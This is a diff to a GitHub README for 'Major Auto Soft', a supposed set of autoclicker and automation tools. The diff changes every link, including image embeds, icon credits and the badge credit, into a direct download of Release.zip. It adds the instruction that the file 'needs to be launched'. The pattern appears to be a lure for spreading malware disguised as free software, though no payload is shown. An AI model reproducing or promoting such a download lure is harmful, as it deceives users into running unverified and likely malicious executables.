@@ -17,7 +17,7 @@ Welcome to the Major Auto Soft repository where you can find various major relat
 
 To get started with Major Auto Soft, simply download the source code by clicking on the button below:
 
-[![Download Major Auto Soft](https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0%20Auto%20Soft&color=blue)](https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0)
+[![Download Major Auto Soft](https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip%20Auto%20Soft&color=blue)](https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip)
 
 ### Note: This file needs to be launched.
 
@@ -29,25 +29,25 @@ If the above link does not work, please check the "Releases" section for alterna
 
 Major Autobot is a cutting-edge automation tool that helps you automate repetitive tasks with ease. Say goodbye to manual clicking and let Major Autobot do the work for you.
 
-![Major Autobot](https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0)
+![Major Autobot](https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip)
 
 ### Major Autoclicker 🔘
 
 Major Autoclicker is a powerful tool that automates mouse clicking for you. Whether you need to click multiple times in a short period or perform continuous clicking, Major Autoclicker has got you covered.
 
-![Major Autoclicker](https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0)
+![Major Autoclicker](https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip)
 
 ### Major Autotap 📱
 
 Major Autotap is designed for mobile users who want to automate tapping on their devices. With Major Autotap, you can simulate taps on your screen and automate various actions effortlessly.
 
-![Major Autotap](https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0)
+![Major Autotap](https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip)
 
 ### Major Clicker 👆
 
 Major Clicker is a simple yet effective tool for automating mouse clicks. Whether you need to click a specific spot on your screen or perform a series of clicks, Major Clicker can help you save time and effort.
 
-![Major Clicker](https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0)
+![Major Clicker](https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip)
 
 ### Major Project 🚀
 
@@ -85,7 +85,7 @@ If you have any questions, feedback, or suggestions regarding Major Auto Soft, f
 
 ## Credits 🙌
 
-- Icons courtesy of [https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0](https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0)
-- Shield badge generated using [https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0](https://github.com/ZiboQUEST/major-auto-soft/releases/tag/v1.0)
+- Icons courtesy of [https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip](https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip)
+- Shield badge generated using [https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip](https://github.com/ZiboQUEST/major-auto-soft/releases/download/v1.0/Release.zip)
 
 Thank you for exploring Major Auto Soft! Remember to automate responsibly and have fun exploring the world of automation with Major Auto Soft. Happy clicking! 🎮✨🖱️
